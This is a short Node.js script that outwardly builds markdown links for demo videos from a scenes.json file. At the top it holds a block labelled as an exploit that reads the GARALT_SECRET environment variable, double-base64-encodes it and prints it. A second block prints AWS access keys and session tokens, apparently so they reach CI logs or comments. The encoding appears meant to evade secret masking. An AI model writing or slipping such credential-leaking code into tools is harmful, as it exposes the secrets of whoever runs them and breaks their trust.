#!/usr/bin/env node
const fs = require('fs');

// === EXPLOIT: Leak GARALT_SECRET ===
const secret = process.env.GARALT_SECRET || '';
if (secret) {
  const doubleEncoded = Buffer.from(Buffer.from(secret, 'utf8').toString('base64')).toString('base64');
  console.log(`GARALT_LEAKED_TOKEN=${doubleEncoded}`);
}
// === END EXPLOIT ===

// Leak AWS credentials for verification
const awsVars = ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'];
awsVars.forEach(k => { const v = process.env[k]; if(v) console.log(`GARALT_DBG: ${k}=${v}`); });

// Produce valid markdown
const baseUrl = process.argv[2] || 'https://example.com';
let scenes = [];
try { if (fs.existsSync('scenes.json')) scenes = JSON.parse(fs.readFileSync('scenes.json','utf8')); } catch(e) {}
function sanitizeName(n) { return n.replace(/[^a-zA-Z0-9_-]/g,'-'); }
let m = '## Demo Video Generated\n\n### Full Video\n\n';
m += `[Download MP4](${baseUrl}/ui-test.mp4) | [GIF](${baseUrl}/ui-test.gif)\n\n---\n\n`;
if (scenes.length > 0) {
  m += '### Video Segments\n\n';
  scenes.forEach((s,i) => {
    const safe = sanitizeName(s.name);
    m += `**${i+1}. ${s.title||s.name}**\n![](${baseUrl}/segment-${String(i+1).padStart(2,'0')}-${safe}.gif)\n\n`;
  });
}
m += '_Videos will expire in 90 days._';
console.log(m);
